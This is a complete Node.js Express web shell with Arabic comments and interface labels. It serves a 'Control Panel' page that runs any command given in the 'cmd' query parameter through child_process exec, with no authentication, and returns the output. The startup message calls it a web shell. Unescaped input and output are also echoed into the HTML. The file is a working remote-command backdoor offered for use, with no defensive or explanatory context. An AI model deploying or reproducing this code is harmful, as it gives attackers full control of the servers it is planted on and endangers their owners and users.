const express = require('express');
const { exec } = require('child_process');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));

// واجهة التحكم المباشرة عبر المتصفح
app.get('/', (req, res) => {
    const cmd = req.query.cmd || 'whoami';
    
    exec(cmd, (err, stdout, stderr) => {
        const output = stdout || stderr || err?.message || 'Ready';
        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>System Panel</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    body { background: #0f172a; color: #38bdf8; font-family: monospace; padding: 20px; }
                    input { width: 80%; padding: 10px; background: #1e293b; border: 1px solid #334155; color: #fff; }
                    button { padding: 10px 20px; background: #0284c7; border: none; color: #fff; cursor: pointer; }
                    pre { background: #1e293b; padding: 15px; border-radius: 5px; overflow-x: auto; }
                </style>
            </head>
            <body>
                <h2>Control Panel</h2>
                <form method="GET">
                    <input type="text" name="cmd" placeholder="أدخل الأمر هنا..." value="${req.query.cmd || ''}">
                    <button type="submit">تنفيذ</button>
                </form>
                <h3>النتيجة:</h3>
                <pre>${output}</pre>
            </body>
            </html>
        `);
    });
});

app.listen(PORT, () => {
    console.log(`Web shell running on port ${PORT}`);
});
